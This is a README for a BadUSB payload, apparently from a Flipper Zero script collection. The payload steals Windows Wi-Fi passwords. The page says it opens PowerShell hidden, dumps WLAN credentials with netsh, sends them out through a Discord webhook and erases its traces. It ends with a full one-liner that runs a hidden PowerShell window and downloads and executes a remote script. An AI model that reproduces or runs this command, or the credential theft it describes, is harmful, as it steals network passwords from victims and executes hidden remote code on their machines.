# WLAN Windows Password - BadUSB ✅

A script used to stole target WLAN Passwords.


**Category**: WLAN, Credentials

<div align=center>

<img src="https://github.com/aleff-github/my-flipper-shits/blob/main/img/logo-repository-2_0.gif" width="600" /><br>
<img src="https://raw.githubusercontent.com/Zenin0/Glitter_Scripts/main/main/img/DISCLAIMER.png?token=GHSAT0AAAAAACJCV62VALXFXVMURW4QNGGOZJVRPVQ" width="600" />

</div>

## Description

A script used to stole target WLAN Passwords.

Opens PowerShell hidden, grabs wlan passwords, saves as a cleartext in a variable and exfiltrates info via Discord Webhook.

Then it cleans up traces of what you have done after.

## Getting Started

### Dependencies

* An internet connection
* Windows 10,11

### Executing program

* Plug in your device
* Invoke 2 netsh commands
* Invoke-WebRequest will be entered in the Run Box to send the content to Discord

All
```powershell
powershell -WindowStyle Hidden -Command "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glitter_Scripts/main/Credentials/W-Wifi-Passwords/W-Wifi-Passwords.ps1?token=GHSAT0AAAAAACJCV62V5276FTVUNEJL35JMZJVRJAA').Content"
```
